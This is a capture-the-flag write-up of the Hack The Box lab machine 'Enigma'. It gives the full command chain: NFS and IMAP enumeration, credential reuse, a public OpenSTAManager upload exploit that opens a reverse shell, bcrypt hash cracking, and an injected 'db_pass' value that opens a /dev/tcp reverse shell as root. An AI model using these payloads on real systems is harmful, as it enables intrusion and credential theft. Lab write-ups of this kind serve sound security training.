---
title: "HTB Enigma - Write-Up"
date: 2026-08-05
categories: [Hack The Box]
tags: [nfs, imap, openstamanager, rce, bcrypt, olivetin, command-injection, privilege-escalation]
---

## Machine Summary

**Enigma** is a medium-difficulty Linux machine that demonstrates a multi-stage attack chain involving:
- **NFS enumeration** exposing sensitive onboarding documents
- **IMAP enumeration** to pivot between mail accounts
- **Arbitrary File Upload RCE** via CVE-2026-38751 in OpenSTAManager
- **MySQL credential extraction** and bcrypt hash cracking
- **Command injection** in OliveTin management interface for root access

---

## Enumeration

### Initial Nmap Scan

```bash
nmap -sS -p- 10.129.239.191
```

**Results:**
```
22/tcp    open  ssh
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
993/tcp   open  imaps
995/tcp   open  pop3s
2049/tcp  open  nfs
```

### Deep Service Enumeration

```bash
nmap -sVC -p 22,80,110,111,143,993,995,2049 10.129.239.191
```

**Key Findings:**
- **Port 22**: OpenSSH 9.6p1 Ubuntu
- **Port 80**: nginx 1.24.0 — "Enigma Corp — Managed IT Solutions"
- **Port 110/143/993/995**: Dovecot pop3d/imapd
- **Port 2049**: NFS (Network File System)
- **Port 111**: RPC portmapper

Add virtual host to `/etc/hosts`:
```bash
echo "10.129.239.191 enigma.htb" | sudo tee -a /etc/hosts
```

---

## Exploitation

### Phase 1: NFS Enumeration → Initial Credentials

#### NFS Share Discovery

```bash
showmount -e 10.129.239.191
```

**Output:**
```
Export list for 10.129.239.191:
/srv/nfs/onboarding *
```

The `*` indicates the share is accessible from any IP without restrictions.

#### Mounting and Extracting Credentials

```bash
mkdir -p /mnt/enigma
sudo mount -t nfs 10.129.239.191:/srv/nfs/onboarding /mnt/enigma
ls -la /mnt/enigma
```

Found: `New_Employee_Access.pdf`

```bash
pdftotext /mnt/enigma/New_Employee_Access.pdf -
```

**Extracted credentials:**
```
URL:      http://mail001.enigma.htb
Username: kevin
Password: Enigma2024!
```

Add to `/etc/hosts`:
```bash
echo "10.129.239.191 mail001.enigma.htb" | sudo tee -a /etc/hosts
```

---

### Phase 2: IMAP Enumeration → Admin Credentials

#### Accessing Kevin's Mailbox

```bash
openssl s_client -connect 10.129.239.191:993
a LOGIN kevin Enigma2024!
b LIST "" "*"
c SELECT INBOX
d FETCH 1:* (BODY[])
```

Found a welcome email from `sarah@enigma.htb` (Accounts Department) referencing credentials delivered via the company shared drive.

#### Accessing Sarah's Mailbox

Testing credential reuse:

```bash
openssl s_client -connect 10.129.239.191:993
a LOGIN sarah Enigma2024!
b SELECT INBOX
c FETCH 1:* (BODY[])
```

**Found internal IT email with OpenSTAManager admin credentials:**
```
URL:      http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

Add to `/etc/hosts`:
```bash
echo "10.129.239.191 support_001.enigma.htb" | sudo tee -a /etc/hosts
```

---

### Phase 3: OpenSTAManager RCE (CVE-2026-38751) → Shell as `www-data`

#### Vulnerability Analysis

**CVE-2026-38751** is an arbitrary file upload vulnerability in OpenSTAManager ≤ 2.10 affecting the module update functionality (`modules/aggiornamenti/upload_modules.php`). CVSS score: 7.2 (HIGH).

The target runs **OpenSTAManager 2.9.8**, which is vulnerable.

#### Exploitation

Using the public exploit:

```bash
git clone https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751
cd OpenSTAManager-RCE-Exploit-CVE-2026-38751
./openstamanager-rce-exploit --url http://support_001.enigma.htb -U admin -P Ne3s4rtars78s --lhost 10.10.14.155 --lport 4444
```

**Output:**
```
[+] Login successful: admin
[+] Updates enabled
[+] Upload successful
[+] Vulnerability confirmed!
[+] Shell: http://support_001.enigma.htb/modules/shell/shell.php
```

**Result:** Reverse shell as `www-data`

#### TTY Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 45 columns 183
```

---

### Phase 4: Lateral Movement → `haris`

#### MySQL Credential Extraction

```bash
grep -i "pass\|user\|db\|host" /var/www/html/openstamanager/config.inc.php
```

**Output:**
```
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

#### Hash Extraction from Database

```bash
mysql -u brollin -pFri3nds@9099 -h localhost openstamanager
```

```sql
SELECT username, password FROM zz_users;
```

**Hashes:**
```
admin | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
haris | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
```

#### Hash Cracking

```bash
echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `haris:bestfriends`

#### Escalation to haris

```bash
su haris
# Password: bestfriends
```

**User flag obtained.**

---

### Phase 5: Privilege Escalation → `root`

#### OliveTin Discovery

```bash
ps aux | grep -i olivetin
```

Found: `/usr/local/bin/OliveTin` running as **root** on port `1337`.

#### Configuration Analysis

```bash
cat /etc/OliveTin/config.yaml
```

Found a vulnerable action:

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - name: db_user
      type: ascii_identifier
    - name: db_pass
      type: password
    - name: db_name
      type: ascii_identifier
```

The `db_pass` parameter is injected directly into a shell command executed as **root**, allowing **command injection**.

#### Exploitation

```bash
# Terminal 1: listener
nc -lvnp 5555

# Terminal 2: command injection via OliveTin API
curl -X POST http://localhost:1337/api/StartAction \
-H "Content-Type: application/json" \
-d '{
  "actionId": "backup_database",
  "arguments": {
    "db_user": "root",
    "db_pass": "x'\'''; bash -i >& /dev/tcp/10.10.14.155/5555 0>&1; '\''",
    "db_name": "mysql"
  }
}'
```

**Result:** Root shell obtained.

```bash
cat /root/root.txt
```

**Root flag obtained.**

---

## Attack Chain Summary

```
┌─────────────────────────────────────────────────┐
│ 1. NFS Enumeration (Port 2049)                 │
│    /srv/nfs/onboarding → PDF with credentials  │
│    kevin / Enigma2024!                          │
└────────────────┬────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────┐
│ 2. IMAP Enumeration (Port 993)                 │
│    kevin → email from sarah                    │
│    sarah / Enigma2024! → admin credentials     │
│    admin / Ne3s4rtars78s (OpenSTAManager)       │
└────────────────┬────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────┐
│ 3. CVE-2026-38751 (OpenSTAManager RCE)         │
│    Arbitrary file upload → webshell            │
│    Shell as www-data                            │
└────────────────┬────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────┐
│ 4. Lateral Movement to haris                   │
│    MySQL credentials in config.inc.php          │
│    Bcrypt hash cracked → bestfriends            │
│    User flag obtained                           │
└────────────────┬────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────┐
│ 5. Privilege Escalation via OliveTin           │
│    Command injection in backup_database action  │
│    OliveTin running as root on port 1337        │
│    Root shell obtained                          │
└─────────────────────────────────────────────────┘
```

---

## Key Takeaways

1. **NFS misconfigurations** can expose sensitive documents to any network host
2. **Credential reuse** across services is a common vulnerability
3. **IMAP enumeration** can reveal internal infrastructure and credentials
4. **Arbitrary file upload** in web applications leads to RCE
5. **Database configuration files** often contain reusable credentials
6. **Internal management tools** running as root with unsanitized input are critical escalation vectors

---

## Tools Used

- `nmap` — Network reconnaissance
- `showmount` — NFS enumeration
- `pdftotext` — PDF content extraction
- `openssl s_client` — IMAP/SSL interaction
- `hashcat` — Bcrypt hash cracking
- `mysql` — Database enumeration
- `curl` — API interaction with OliveTin
- Python3 — TTY stabilization

---

## CVEs Referenced

- **CVE-2026-38751** — OpenSTAManager ≤ 2.10 arbitrary file upload (CVSS 7.2)

---

## References

- [OpenSTAManager GitHub](https://github.com/devcode-it/openstamanager)
- [CVE-2026-38751 NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-38751)
- [OliveTin Documentation](https://docs.olivetin.app)
- [Dovecot IMAP Documentation](https://doc.dovecot.org)

---

*Writeup by: Darkstinx*  
*Date: August 2, 2026*
